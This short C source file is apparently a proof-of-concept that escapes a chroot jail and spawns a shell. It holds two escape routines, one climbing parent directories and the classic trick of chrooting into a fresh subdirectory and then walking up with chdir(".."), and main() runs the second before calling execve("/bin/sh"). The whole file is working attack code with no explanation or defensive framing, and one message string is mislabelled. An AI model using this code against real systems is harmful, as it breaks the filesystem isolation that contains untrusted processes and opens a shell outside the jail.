
int spawn_sh()
{
    execve("/bin/sh", NULL, NULL);
}

int attack_chroot_escape2()
{
    printf("chroot escape2!\n");
    chdir("../../../../../../..");
    chroot(".");
}

int attack_chroot_escape3()
{
    printf("chroot escape2!\n");
    mkdir(".42", 0755);
    chroot(".42");
    //fchdir(3); // there is a log file open at fd 3
    chdir("..");
    chroot(".");
}

int main()
{
     attack_chroot_escape3();
     spawn_sh(); 
}
